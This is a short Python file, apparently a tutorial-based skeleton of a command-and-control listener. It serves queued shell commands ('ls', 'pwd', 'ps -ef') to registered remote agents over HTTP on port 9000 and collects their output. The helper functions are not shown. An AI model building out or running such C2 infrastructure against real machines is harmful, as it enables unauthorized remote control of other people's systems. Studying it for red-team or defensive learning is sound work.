#!/usr/bin/python3

# ref: https://www.youtube.com/watch?v=kogOfxg1c_g
# ref: https://www.youtube.com/watch?v=dgvLegLW6ek


# HTTPServer class allows you to define what port for your HTTP svr to
# listen on.
# The BaseHTTPRequestHandler class enables management of your various
# HTTP requests (e.g. GET, POST, etc)
from http.server import HTTPServer, BaseHTTPRequestHandler


from .listener_helper import register_agent, serve_tasks, collect_results

tasklist = ['*cmd,ls', '*cmd,pwd,', '*cmd,ps,e,f']

class Listener:
    def __init__(self, name):
        self.name = name


class http_server:
    def __init__(self, listener):
        Handler.listener = listener
        server = HTTPServer(('', 9000), Handler)
        print(f"Listener running on port 9000\n")
        server.serve_forever()


class Handler(BaseHTTPRequestHandler):
    listener = None
    def do_GET(self):
        if self.path.endswith('/tasks/uuid'):
            serve_tasks(self)

    def do_POST(self):
        if self.path.endswith('/reg'):
            register_agent(self)
        if self.path.endswith('results/uuid'):
            collect_results(self)
